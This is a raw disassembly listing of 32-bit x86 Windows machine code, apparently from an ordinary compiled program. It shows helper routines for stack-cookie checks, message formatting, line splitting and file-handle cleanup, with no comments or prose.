  4016f3:	e8 0d 01 00 00       	call   0x401805
  4016f8:	ff 75 0c             	push   0xc(%ebp)
  4016fb:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4016fe:	50                   	push   %eax
  4016ff:	e8 93 00 00 00       	call   0x401797
  401704:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  401707:	e8 42 64 00 00       	call   0x407b4e
  40170c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40170f:	33 cd                	xor    %ebp,%ecx
  401711:	e8 43 4e 01 00       	call   0x416559
  401716:	c9                   	leave
  401717:	c2 08 00             	ret    $0x8
  40171a:	55                   	push   %ebp
  40171b:	8b ec                	mov    %esp,%ebp
  40171d:	83 ec 50             	sub    $0x50,%esp
  401720:	a1 5c 56 43 00       	mov    0x43565c,%eax
  401725:	33 c5                	xor    %ebp,%eax
  401727:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40172a:	ff 75 08             	push   0x8(%ebp)
  40172d:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  401730:	e8 d0 00 00 00       	call   0x401805
  401735:	ff 75 10             	push   0x10(%ebp)
  401738:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40173b:	ff 75 0c             	push   0xc(%ebp)
  40173e:	50                   	push   %eax
  40173f:	e8 6e 00 00 00       	call   0x4017b2
  401744:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  401747:	e8 02 64 00 00       	call   0x407b4e
  40174c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40174f:	33 cd                	xor    %ebp,%ecx
  401751:	e8 03 4e 01 00       	call   0x416559
  401756:	c9                   	leave
  401757:	c2 0c 00             	ret    $0xc
  40175a:	55                   	push   %ebp
  40175b:	8b ec                	mov    %esp,%ebp
  40175d:	83 ec 50             	sub    $0x50,%esp
  401760:	a1 5c 56 43 00       	mov    0x43565c,%eax
  401765:	33 c5                	xor    %ebp,%eax
  401767:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40176a:	ff 75 08             	push   0x8(%ebp)
  40176d:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  401770:	e8 90 00 00 00       	call   0x401805
  401775:	ff 75 0c             	push   0xc(%ebp)
  401778:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40177b:	50                   	push   %eax
  40177c:	e8 56 00 00 00       	call   0x4017d7
  401781:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  401784:	e8 c5 63 00 00       	call   0x407b4e
  401789:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40178c:	33 cd                	xor    %ebp,%ecx
  40178e:	e8 c6 4d 01 00       	call   0x416559
  401793:	c9                   	leave
  401794:	c2 08 00             	ret    $0x8
  401797:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40179b:	8b 51 40             	mov    0x40(%ecx),%edx
  40179e:	83 fa 08             	cmp    $0x8,%edx
  4017a1:	73 0c                	jae    0x4017af
  4017a3:	8b 44 24 08          	mov    0x8(%esp),%eax
  4017a7:	8b 00                	mov    (%eax),%eax
  4017a9:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  4017ac:	ff 41 40             	incl   0x40(%ecx)
  4017af:	c2 08 00             	ret    $0x8
  4017b2:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4017b6:	8b 51 40             	mov    0x40(%ecx),%edx
  4017b9:	83 fa 08             	cmp    $0x8,%edx
  4017bc:	73 0c                	jae    0x4017ca
  4017be:	8b 44 24 08          	mov    0x8(%esp),%eax
  4017c2:	8b 00                	mov    (%eax),%eax
  4017c4:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  4017c7:	ff 41 40             	incl   0x40(%ecx)
  4017ca:	ff 74 24 0c          	push   0xc(%esp)
  4017ce:	51                   	push   %ecx
  4017cf:	e8 c3 ff ff ff       	call   0x401797
  4017d4:	c2 0c 00             	ret    $0xc
  4017d7:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4017db:	8b 51 40             	mov    0x40(%ecx),%edx
  4017de:	83 fa 08             	cmp    $0x8,%edx
  4017e1:	73 0a                	jae    0x4017ed
  4017e3:	8b 44 24 08          	mov    0x8(%esp),%eax
  4017e7:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  4017ea:	ff 41 40             	incl   0x40(%ecx)
  4017ed:	c2 08 00             	ret    $0x8
  4017f0:	33 c0                	xor    %eax,%eax
  4017f2:	c7 41 08 01 00 00 00 	movl   $0x1,0x8(%ecx)
  4017f9:	89 01                	mov    %eax,(%ecx)
  4017fb:	89 41 04             	mov    %eax,0x4(%ecx)
  4017fe:	66 89 41 0c          	mov    %ax,0xc(%ecx)
  401802:	8b c1                	mov    %ecx,%eax
  401804:	c3                   	ret
  401805:	56                   	push   %esi
  401806:	57                   	push   %edi
  401807:	8b f1                	mov    %ecx,%esi
  401809:	b8 84 a5 42 00       	mov    $0x42a584,%eax
  40180e:	6a 08                	push   $0x8
  401810:	59                   	pop    %ecx
  401811:	8b fe                	mov    %esi,%edi
  401813:	f3 ab                	rep stos %eax,%es:(%edi)
  401815:	6a 20                	push   $0x20
  401817:	33 ff                	xor    %edi,%edi
  401819:	8d 46 20             	lea    0x20(%esi),%eax
  40181c:	57                   	push   %edi
  40181d:	50                   	push   %eax
  40181e:	e8 6d 5e 01 00       	call   0x417690
  401823:	8b 44 24 18          	mov    0x18(%esp),%eax
  401827:	83 c4 0c             	add    $0xc,%esp
  40182a:	89 7e 40             	mov    %edi,0x40(%esi)
  40182d:	89 7e 44             	mov    %edi,0x44(%esi)
  401830:	89 46 48             	mov    %eax,0x48(%esi)
  401833:	8b c6                	mov    %esi,%eax
  401835:	5f                   	pop    %edi
  401836:	5e                   	pop    %esi
  401837:	c2 04 00             	ret    $0x4
  40183a:	56                   	push   %esi
  40183b:	8d 44 24 08          	lea    0x8(%esp),%eax
  40183f:	8b f1                	mov    %ecx,%esi
  401841:	50                   	push   %eax
  401842:	6a 19                	push   $0x19
  401844:	e8 94 fe ff ff       	call   0x4016dd
  401849:	6a 03                	push   $0x3
  40184b:	8b ce                	mov    %esi,%ecx
  40184d:	e8 f8 01 00 00       	call   0x401a4a
  401852:	5e                   	pop    %esi
  401853:	c2 04 00             	ret    $0x4
  401856:	6a 0c                	push   $0xc
  401858:	e8 ed 01 00 00       	call   0x401a4a
  40185d:	8b 44 24 08          	mov    0x8(%esp),%eax
  401861:	c6 00 01             	movb   $0x1,(%eax)
  401864:	c2 10 00             	ret    $0x10
  401867:	56                   	push   %esi
  401868:	8b f1                	mov    %ecx,%esi
  40186a:	80 7e 09 00          	cmpb   $0x0,0x9(%esi)
  40186e:	75 1c                	jne    0x40188c
  401870:	e8 1d 02 00 00       	call   0x401a92
  401875:	ff 74 24 0c          	push   0xc(%esp)
  401879:	ff 74 24 0c          	push   0xc(%esp)
  40187d:	e8 20 66 00 00       	call   0x407ea2
  401882:	84 c0                	test   %al,%al
  401884:	75 08                	jne    0x40188e
  401886:	c6 46 0a 01          	movb   $0x1,0xa(%esi)
  40188a:	eb 02                	jmp    0x40188e
  40188c:	32 c0                	xor    %al,%al
  40188e:	5e                   	pop    %esi
  40188f:	c2 08 00             	ret    $0x8
  401892:	56                   	push   %esi
  401893:	8b f1                	mov    %ecx,%esi
  401895:	80 7e 0c 00          	cmpb   $0x0,0xc(%esi)
  401899:	75 13                	jne    0x4018ae
  40189b:	8d 44 24 08          	lea    0x8(%esp),%eax
  40189f:	50                   	push   %eax
  4018a0:	6a 0a                	push   $0xa
  4018a2:	e8 36 fe ff ff       	call   0x4016dd
  4018a7:	8b ce                	mov    %esi,%ecx
  4018a9:	e8 e4 01 00 00       	call   0x401a92
  4018ae:	6a 02                	push   $0x2
  4018b0:	8b ce                	mov    %esi,%ecx
  4018b2:	e8 93 01 00 00       	call   0x401a4a
  4018b7:	5e                   	pop    %esi
  4018b8:	c2 04 00             	ret    $0x4
  4018bb:	56                   	push   %esi
  4018bc:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4018c0:	8b f1                	mov    %ecx,%esi
  4018c2:	50                   	push   %eax
  4018c3:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4018c7:	50                   	push   %eax
  4018c8:	6a 09                	push   $0x9
  4018ca:	e8 4b fe ff ff       	call   0x40171a
  4018cf:	8b ce                	mov    %esi,%ecx
  4018d1:	e8 bc 01 00 00       	call   0x401a92
  4018d6:	6a 09                	push   $0x9
  4018d8:	8b ce                	mov    %esi,%ecx
  4018da:	e8 6b 01 00 00       	call   0x401a4a
  4018df:	5e                   	pop    %esi
  4018e0:	c2 08 00             	ret    $0x8
  4018e3:	e9 53 02 00 00       	jmp    0x401b3b
  4018e8:	55                   	push   %ebp
  4018e9:	8b ec                	mov    %esp,%ebp
  4018eb:	81 ec 04 08 00 00    	sub    $0x804,%esp
  4018f1:	a1 5c 56 43 00       	mov    0x43565c,%eax
  4018f6:	33 c5                	xor    %ebp,%eax
  4018f8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4018fb:	8d 45 10             	lea    0x10(%ebp),%eax
  4018fe:	50                   	push   %eax
  4018ff:	6a 00                	push   $0x0
  401901:	ff 75 0c             	push   0xc(%ebp)
  401904:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  40190a:	68 00 04 00 00       	push   $0x400
  40190f:	50                   	push   %eax
  401910:	e8 c4 02 00 00       	call   0x401bd9
  401915:	83 c4 14             	add    $0x14,%esp
  401918:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  40191e:	50                   	push   %eax
  40191f:	6a 01                	push   $0x1
  401921:	e8 34 fe ff ff       	call   0x40175a
  401926:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401929:	e8 64 01 00 00       	call   0x401a92
  40192e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401931:	33 cd                	xor    %ebp,%ecx
  401933:	e8 21 4c 01 00       	call   0x416559
  401938:	c9                   	leave
  401939:	c3                   	ret
  40193a:	ff 15 00 a0 42 00    	call   *0x42a000
  401940:	85 c0                	test   %eax,%eax
  401942:	74 24                	je     0x401968
  401944:	6a 00                	push   $0x0
  401946:	ff 74 24 0c          	push   0xc(%esp)
  40194a:	ff 74 24 0c          	push   0xc(%esp)
  40194e:	68 00 04 00 00       	push   $0x400
  401953:	50                   	push   %eax
  401954:	6a 00                	push   $0x0
  401956:	68 00 12 00 00       	push   $0x1200
  40195b:	ff 15 08 a0 42 00    	call   *0x42a008
  401961:	85 c0                	test   %eax,%eax
  401963:	0f 95 c0             	setne  %al
  401966:	eb 02                	jmp    0x40196a
  401968:	32 c0                	xor    %al,%al
  40196a:	c2 08 00             	ret    $0x8
  40196d:	56                   	push   %esi
  40196e:	8b f1                	mov    %ecx,%esi
  401970:	e8 0b 00 00 00       	call   0x401980
  401975:	6a 08                	push   $0x8
  401977:	8b ce                	mov    %esi,%ecx
  401979:	e8 bd 01 00 00       	call   0x401b3b
  40197e:	5e                   	pop    %esi
  40197f:	c3                   	ret
  401980:	56                   	push   %esi
  401981:	6a 07                	push   $0x7
  401983:	8b f1                	mov    %ecx,%esi
  401985:	e8 22 fd ff ff       	call   0x4016ac
  40198a:	6a 08                	push   $0x8
  40198c:	8b ce                	mov    %esi,%ecx
  40198e:	e8 b7 00 00 00       	call   0x401a4a
  401993:	5e                   	pop    %esi
  401994:	c3                   	ret
  401995:	56                   	push   %esi
  401996:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40199a:	8b f1                	mov    %ecx,%esi
  40199c:	50                   	push   %eax
  40199d:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4019a1:	50                   	push   %eax
  4019a2:	6a 08                	push   $0x8
  4019a4:	e8 71 fd ff ff       	call   0x40171a
  4019a9:	8b ce                	mov    %esi,%ecx
  4019ab:	e8 e2 00 00 00       	call   0x401a92
  4019b0:	6a 06                	push   $0x6
  4019b2:	8b ce                	mov    %esi,%ecx
  4019b4:	e8 91 00 00 00       	call   0x401a4a
  4019b9:	e8 32 5f 00 00       	call   0x4078f0
  4019be:	5e                   	pop    %esi
  4019bf:	c2 08 00             	ret    $0x8
  4019c2:	ff 74 24 04          	push   0x4(%esp)
  4019c6:	6a 00                	push   $0x0
  4019c8:	e8 c8 ff ff ff       	call   0x401995
  4019cd:	c2 04 00             	ret    $0x4
  4019d0:	56                   	push   %esi
  4019d1:	ff 74 24 08          	push   0x8(%esp)
  4019d5:	8b f1                	mov    %ecx,%esi
  4019d7:	6a 00                	push   $0x0
  4019d9:	e8 0d 00 00 00       	call   0x4019eb
  4019de:	6a 0c                	push   $0xc
  4019e0:	8b ce                	mov    %esi,%ecx
  4019e2:	e8 54 01 00 00       	call   0x401b3b
  4019e7:	5e                   	pop    %esi
  4019e8:	c2 04 00             	ret    $0x4
  4019eb:	56                   	push   %esi
  4019ec:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4019f0:	8b f1                	mov    %ecx,%esi
  4019f2:	50                   	push   %eax
  4019f3:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4019f7:	50                   	push   %eax
  4019f8:	6a 0c                	push   $0xc
  4019fa:	e8 1b fd ff ff       	call   0x40171a
  4019ff:	8b ce                	mov    %esi,%ecx
  401a01:	e8 8c 00 00 00       	call   0x401a92
  401a06:	6a 0c                	push   $0xc
  401a08:	8b ce                	mov    %esi,%ecx
  401a0a:	e8 3b 00 00 00       	call   0x401a4a
  401a0f:	5e                   	pop    %esi
  401a10:	c2 08 00             	ret    $0x8
  401a13:	ff 74 24 04          	push   0x4(%esp)
  401a17:	6a 00                	push   $0x0
  401a19:	e8 cd ff ff ff       	call   0x4019eb
  401a1e:	c2 04 00             	ret    $0x4
  401a21:	56                   	push   %esi
  401a22:	8b f1                	mov    %ecx,%esi
  401a24:	80 7e 0c 00          	cmpb   $0x0,0xc(%esi)
  401a28:	75 13                	jne    0x401a3d
  401a2a:	8d 44 24 08          	lea    0x8(%esp),%eax
  401a2e:	50                   	push   %eax
  401a2f:	6a 0b                	push   $0xb
  401a31:	e8 a7 fc ff ff       	call   0x4016dd
  401a36:	8b ce                	mov    %esi,%ecx
  401a38:	e8 55 00 00 00       	call   0x401a92
  401a3d:	6a 02                	push   $0x2
  401a3f:	8b ce                	mov    %esi,%ecx
  401a41:	e8 f5 00 00 00       	call   0x401b3b
  401a46:	5e                   	pop    %esi
  401a47:	c2 04 00             	ret    $0x4
  401a4a:	8b 54 24 04          	mov    0x4(%esp),%edx
  401a4e:	8b c2                	mov    %edx,%eax
  401a50:	83 e8 01             	sub    $0x1,%eax
  401a53:	74 11                	je     0x401a66
  401a55:	83 e8 01             	sub    $0x1,%eax
  401a58:	74 26                	je     0x401a80
  401a5a:	83 e8 01             	sub    $0x1,%eax
  401a5d:	74 14                	je     0x401a73
  401a5f:	2d fc 00 00 00       	sub    $0xfc,%eax
  401a64:	75 05                	jne    0x401a6b
  401a66:	83 39 00             	cmpl   $0x0,(%ecx)
  401a69:	75 02                	jne    0x401a6d
  401a6b:	89 11                	mov    %edx,(%ecx)
  401a6d:	ff 41 04             	incl   0x4(%ecx)
  401a70:	c2 04 00             	ret    $0x4
  401a73:	83 39 0b             	cmpl   $0xb,(%ecx)
  401a76:	74 f5                	je     0x401a6d
  401a78:	c7 01 03 00 00 00    	movl   $0x3,(%ecx)
  401a7e:	eb ed                	jmp    0x401a6d
  401a80:	83 39 00             	cmpl   $0x0,(%ecx)
  401a83:	74 05                	je     0x401a8a
  401a85:	83 39 01             	cmpl   $0x1,(%ecx)
  401a88:	75 e3                	jne    0x401a6d
  401a8a:	c7 01 02 00 00 00    	movl   $0x2,(%ecx)
  401a90:	eb db                	jmp    0x401a6d
  401a92:	81 ec 08 08 00 00    	sub    $0x808,%esp
  401a98:	a1 5c 56 43 00       	mov    0x43565c,%eax
  401a9d:	33 c4                	xor    %esp,%eax
  401a9f:	89 84 24 04 08 00 00 	mov    %eax,0x804(%esp)
  401aa6:	68 00 04 00 00       	push   $0x400
  401aab:	8d 44 24 08          	lea    0x8(%esp),%eax
  401aaf:	50                   	push   %eax
  401ab0:	e8 85 fe ff ff       	call   0x40193a
  401ab5:	84 c0                	test   %al,%al
  401ab7:	74 6d                	je     0x401b26
  401ab9:	53                   	push   %ebx
  401aba:	55                   	push   %ebp
  401abb:	56                   	push   %esi
  401abc:	6a 0d                	push   $0xd
  401abe:	5b                   	pop    %ebx
  401abf:	6a 0a                	push   $0xa
  401ac1:	8d 74 24 14          	lea    0x14(%esp),%esi
  401ac5:	5d                   	pop    %ebp
  401ac6:	89 74 24 0c          	mov    %esi,0xc(%esp)
  401aca:	57                   	push   %edi
  401acb:	0f b7 06             	movzwl (%esi),%eax
  401ace:	66 3b c3             	cmp    %bx,%ax
  401ad1:	74 05                	je     0x401ad8
  401ad3:	66 3b c5             	cmp    %bp,%ax
  401ad6:	75 05                	jne    0x401add
  401ad8:	83 c6 02             	add    $0x2,%esi
  401adb:	eb ee                	jmp    0x401acb
  401add:	89 74 24 10          	mov    %esi,0x10(%esp)
  401ae1:	66 85 c0             	test   %ax,%ax
  401ae4:	74 3c                	je     0x401b22
  401ae6:	53                   	push   %ebx
  401ae7:	56                   	push   %esi
  401ae8:	e8 b3 60 01 00       	call   0x417ba0
  401aed:	8b f8                	mov    %eax,%edi
  401aef:	59                   	pop    %ecx
  401af0:	59                   	pop    %ecx
  401af1:	85 ff                	test   %edi,%edi
  401af3:	75 0f                	jne    0x401b04
  401af5:	55                   	push   %ebp
  401af6:	56                   	push   %esi
  401af7:	e8 a4 60 01 00       	call   0x417ba0
  401afc:	8b f8                	mov    %eax,%edi
  401afe:	59                   	pop    %ecx
  401aff:	59                   	pop    %ecx
  401b00:	85 ff                	test   %edi,%edi
  401b02:	74 08                	je     0x401b0c
  401b04:	33 c0                	xor    %eax,%eax
  401b06:	66 89 07             	mov    %ax,(%edi)
  401b09:	83 c7 02             	add    $0x2,%edi
  401b0c:	8d 44 24 10          	lea    0x10(%esp),%eax
  401b10:	50                   	push   %eax
  401b11:	6a 00                	push   $0x0
  401b13:	e8 c5 fb ff ff       	call   0x4016dd
  401b18:	8b f7                	mov    %edi,%esi
  401b1a:	89 74 24 10          	mov    %esi,0x10(%esp)
  401b1e:	85 ff                	test   %edi,%edi
  401b20:	75 a9                	jne    0x401acb
  401b22:	5f                   	pop    %edi
  401b23:	5e                   	pop    %esi
  401b24:	5d                   	pop    %ebp
  401b25:	5b                   	pop    %ebx
  401b26:	8b 8c 24 04 08 00 00 	mov    0x804(%esp),%ecx
  401b2d:	33 cc                	xor    %esp,%ecx
  401b2f:	e8 25 4a 01 00       	call   0x416559
  401b34:	81 c4 08 08 00 00    	add    $0x808,%esp
  401b3a:	c3                   	ret
  401b3b:	55                   	push   %ebp
  401b3c:	8b ec                	mov    %esp,%ebp
  401b3e:	51                   	push   %ecx
  401b3f:	56                   	push   %esi
  401b40:	8b 75 08             	mov    0x8(%ebp),%esi
  401b43:	81 fe ff 00 00 00    	cmp    $0xff,%esi
  401b49:	75 0b                	jne    0x401b56
  401b4b:	80 79 08 00          	cmpb   $0x0,0x8(%ecx)
  401b4f:	75 05                	jne    0x401b56
  401b51:	5e                   	pop    %esi
  401b52:	c9                   	leave
  401b53:	c2 04 00             	ret    $0x4
  401b56:	56                   	push   %esi
  401b57:	e8 ee fe ff ff       	call   0x401a4a
  401b5c:	68 b4 26 43 00       	push   $0x4326b4
  401b61:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401b64:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401b67:	50                   	push   %eax
  401b68:	e8 e3 60 01 00       	call   0x417c50
  401b6d:	cc                   	int3
  401b6e:	8d 44 24 08          	lea    0x8(%esp),%eax
  401b72:	50                   	push   %eax
  401b73:	8d 44 24 08          	lea    0x8(%esp),%eax
  401b77:	50                   	push   %eax
  401b78:	6a 21                	push   $0x21
  401b7a:	e8 9b fb ff ff       	call   0x40171a
  401b7f:	6a 02                	push   $0x2
  401b81:	b9 ac bd 45 00       	mov    $0x45bdac,%ecx
  401b86:	e8 bf fe ff ff       	call   0x401a4a
  401b8b:	c2 08 00             	ret    $0x8
  401b8e:	56                   	push   %esi
  401b8f:	ff 74 24 0c          	push   0xc(%esp)
  401b93:	8b f1                	mov    %ecx,%esi
  401b95:	ff 74 24 0c          	push   0xc(%esp)
  401b99:	e8 0d 00 00 00       	call   0x401bab
  401b9e:	6a 05                	push   $0x5
  401ba0:	8b ce                	mov    %esi,%ecx
  401ba2:	e8 94 ff ff ff       	call   0x401b3b
  401ba7:	5e                   	pop    %esi
  401ba8:	c2 08 00             	ret    $0x8
  401bab:	56                   	push   %esi
  401bac:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401bb0:	8b f1                	mov    %ecx,%esi
  401bb2:	50                   	push   %eax
  401bb3:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401bb7:	50                   	push   %eax
  401bb8:	6a 0d                	push   $0xd
  401bba:	e8 5b fb ff ff       	call   0x40171a
  401bbf:	8b ce                	mov    %esi,%ecx
  401bc1:	e8 cc fe ff ff       	call   0x401a92
  401bc6:	6a 05                	push   $0x5
  401bc8:	8b ce                	mov    %esi,%ecx
  401bca:	e8 7b fe ff ff       	call   0x401a4a
  401bcf:	5e                   	pop    %esi
  401bd0:	c2 08 00             	ret    $0x8
  401bd3:	b8 18 7f 43 00       	mov    $0x437f18,%eax
  401bd8:	c3                   	ret
  401bd9:	55                   	push   %ebp
  401bda:	8b ec                	mov    %esp,%ebp
  401bdc:	ff 75 18             	push   0x18(%ebp)
  401bdf:	ff 75 14             	push   0x14(%ebp)
  401be2:	ff 75 10             	push   0x10(%ebp)
  401be5:	ff 75 0c             	push   0xc(%ebp)
  401be8:	ff 75 08             	push   0x8(%ebp)
  401beb:	e8 e3 ff ff ff       	call   0x401bd3
  401bf0:	ff 70 04             	push   0x4(%eax)
  401bf3:	ff 30                	push   (%eax)
  401bf5:	e8 6d b9 01 00       	call   0x41d567
  401bfa:	83 c4 1c             	add    $0x1c,%esp
  401bfd:	85 c0                	test   %eax,%eax
  401bff:	79 03                	jns    0x401c04
  401c01:	83 c8 ff             	or     $0xffffffff,%eax
  401c04:	5d                   	pop    %ebp
  401c05:	c3                   	ret
  401c06:	83 49 08 ff          	orl    $0xffffffff,0x8(%ecx)
  401c0a:	33 c0                	xor    %eax,%eax
  401c0c:	66 89 41 32          	mov    %ax,0x32(%ecx)
  401c10:	88 41 0c             	mov    %al,0xc(%ecx)
  401c13:	89 41 10             	mov    %eax,0x10(%ecx)
  401c16:	66 89 41 14          	mov    %ax,0x14(%ecx)
  401c1a:	89 81 34 10 00 00    	mov    %eax,0x1034(%ecx)
  401c20:	88 41 30             	mov    %al,0x30(%ecx)
  401c23:	66 89 41 24          	mov    %ax,0x24(%ecx)
  401c27:	89 41 18             	mov    %eax,0x18(%ecx)
  401c2a:	89 41 28             	mov    %eax,0x28(%ecx)
  401c2d:	89 41 2c             	mov    %eax,0x2c(%ecx)
  401c30:	8b c1                	mov    %ecx,%eax
  401c32:	c7 01 88 a5 42 00    	movl   $0x42a588,(%ecx)
  401c38:	66 c7 41 1c 00 01    	movw   $0x100,0x1c(%ecx)
  401c3e:	c6 41 1e 01          	movb   $0x1,0x1e(%ecx)
  401c42:	c7 41 20 00 01 00 00 	movl   $0x100,0x20(%ecx)
  401c49:	c3                   	ret
  401c4a:	33 c0                	xor    %eax,%eax
  401c4c:	89 81 10 10 00 00    	mov    %eax,0x1010(%ecx)
  401c52:	89 81 14 10 00 00    	mov    %eax,0x1014(%ecx)
  401c58:	89 81 18 10 00 00    	mov    %eax,0x1018(%ecx)
  401c5e:	89 81 1c 10 00 00    	mov    %eax,0x101c(%ecx)
  401c64:	89 81 20 10 00 00    	mov    %eax,0x1020(%ecx)
  401c6a:	89 81 24 10 00 00    	mov    %eax,0x1024(%ecx)
  401c70:	8b c1                	mov    %ecx,%eax
  401c72:	c3                   	ret
  401c73:	55                   	push   %ebp
  401c74:	8b ec                	mov    %esp,%ebp
  401c76:	6a ff                	push   $0xffffffff
  401c78:	68 b4 9a 42 00       	push   $0x429ab4
  401c7d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401c83:	50                   	push   %eax
  401c84:	a1 5c 56 43 00       	mov    0x43565c,%eax
  401c89:	33 c5                	xor    %ebp,%eax
  401c8b:	50                   	push   %eax
  401c8c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401c8f:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401c95:	83 79 08 ff          	cmpl   $0xffffffff,0x8(%ecx)
  401c99:	c7 01 88 a5 42 00    	movl   $0x42a588,(%ecx)
  401c9f:	74 18                	je     0x401cb9
  401ca1:	80 79 15 00          	cmpb   $0x0,0x15(%ecx)
  401ca5:	75 12                	jne    0x401cb9
  401ca7:	80 79 1c 00          	cmpb   $0x0,0x1c(%ecx)
  401cab:	74 07                	je     0x401cb4
  401cad:	e8 98 01 00 00       	call   0x401e4a
  401cb2:	eb 05                	jmp    0x401cb9
  401cb4:	e8 47 00 00 00       	call   0x401d00
  401cb9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401cbc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401cc3:	59                   	pop    %ecx
  401cc4:	c9                   	leave
  401cc5:	c3                   	ret
  401cc6:	cc                   	int3
  401cc7:	cc                   	int3
  401cc8:	cc                   	int3
  401cc9:	cc                   	int3
  401cca:	cc                   	int3
  401ccb:	cc                   	int3
  401ccc:	cc                   	int3
  401ccd:	cc                   	int3
  401cce:	cc                   	int3
  401ccf:	cc                   	int3
  401cd0:	56                   	push   %esi
  401cd1:	8b f1                	mov    %ecx,%esi
  401cd3:	e8 9b ff ff ff       	call   0x401c73
  401cd8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401cdd:	74 0d                	je     0x401cec
  401cdf:	68 40 10 00 00       	push   $0x1040
  401ce4:	56                   	push   %esi
  401ce5:	e8 7d 48 01 00       	call   0x416567
  401cea:	59                   	pop    %ecx
  401ceb:	59                   	pop    %ecx
  401cec:	8b c6                	mov    %esi,%eax
  401cee:	5e                   	pop    %esi
  401cef:	c2 04 00             	ret    $0x4
  401cf2:	cc                   	int3
  401cf3:	cc                   	int3
  401cf4:	cc                   	int3
  401cf5:	cc                   	int3
  401cf6:	cc                   	int3
  401cf7:	cc                   	int3
  401cf8:	cc                   	int3
  401cf9:	cc                   	int3
  401cfa:	cc                   	int3
  401cfb:	cc                   	int3
  401cfc:	cc                   	int3
  401cfd:	cc                   	int3
  401cfe:	cc                   	int3
  401cff:	cc                   	int3
  401d00:	53                   	push   %ebx
  401d01:	56                   	push   %esi
  401d02:	8b f1                	mov    %ecx,%esi
  401d04:	b3 01                	mov    $0x1,%bl
  401d06:	83 7e 08 ff          	cmpl   $0xffffffff,0x8(%esi)
  401d0a:	74 22                	je     0x401d2e
  401d0c:	80 7e 15 00          	cmpb   $0x0,0x15(%esi)
  401d10:	75 18                	jne    0x401d2a
  401d12:	83 7e 10 00          	cmpl   $0x0,0x10(%esi)
  401d16:	75 12                	jne    0x401d2a
  401d18:	ff 76 08             	push   0x8(%esi)
  401d1b:	ff 15 2c a0 42 00    	call   *0x42a02c
  401d21:	8d 58 ff             	lea    -0x1(%eax),%ebx
  401d24:	f7 db                	neg    %ebx
  401d26:	1a db                	sbb    %bl,%bl
  401d28:	fe c3                	inc    %bl
  401d2a:	83 4e 08 ff          	orl    $0xffffffff,0x8(%esi)
  401d2e:	83 66 10 00          	andl   $0x0,0x10(%esi)
  401d32:	84 db                	test   %bl,%bl
  401d34:	75 13                	jne    0x401d49
  401d36:	38 5e 1e             	cmp    %bl,0x1e(%esi)
  401d39:	74 0e                	je     0x401d49
  401d3b:	8d 46 32             	lea    0x32(%esi),%eax
  401d3e:	b9 ac bd 45 00       	mov    $0x45bdac,%ecx
  401d43:	50                   	push   %eax
  401d44:	e8 49 fb ff ff       	call   0x401892
  401d49:	5e                   	pop    %esi
  401d4a:	8a c3                	mov    %bl,%al
  401d4c:	5b                   	pop    %ebx
  401d4d:	c3                   	ret
  401d4e:	b8 08 10 00 00       	mov    $0x1008,%eax
  401d53:	e8 a8 48 01 00       	call   0x416600
  401d58:	a1 5c 56 43 00       	mov    0x43565c,%eax
  401d5d:	33 c4                	xor    %esp,%eax
  401d5f:	89 84 24 04 10 00 00 	mov    %eax,0x1004(%esp)
  401d66:	53                   	push   %ebx
  401d67:	8b 9c 24 14 10 00 00 	mov    0x1014(%esp),%ebx
  401d6e:	33 c0                	xor    %eax,%eax
  401d70:	55                   	push   %ebp
  401d71:	8b ac 24 14 10 00 00 	mov    0x1014(%esp),%ebp
  401d78:	40                   	inc    %eax
  401d79:	56                   	push   %esi
  401d7a:	57                   	push   %edi
  401d7b:	8b fb                	mov    %ebx,%edi
  401d7d:	8b f1                	mov    %ecx,%esi
  401d7f:	d1 ef                	shr    $1,%edi
  401d81:	f6 c3 10             	test   $0x10,%bl
  401d84:	75 0d                	jne    0x401d93
  401d86:	80 7e 30 00          	cmpb   $0x0,0x30(%esi)
  401d8a:	75 07                	jne    0x401d93
  401d8c:	83 64 24 10 00       	andl   $0x0,0x10(%esp)
  401d91:	eb 04                	jmp    0x401d97
  401d93:	89 44 24 10          	mov    %eax,0x10(%esp)
  401d97:	33 f8                	xor    %eax,%edi
  401d99:	89 5e 20             	mov    %ebx,0x20(%esi)
  401d9c:	c1 e7 1f             	shl    $0x1f,%edi
  401d9f:	55                   	push   %ebp
  401da0:	81 c7 00 00 00 40    	add    $0x40000000,%edi
  401da6:	e8 62 22 00 00       	call   0x40400d
  401dab:	0f b7 00             	movzwl (%eax),%eax
  401dae:	83 f8 2e             	cmp    $0x2e,%eax
  401db1:	74 05                	je     0x401db8
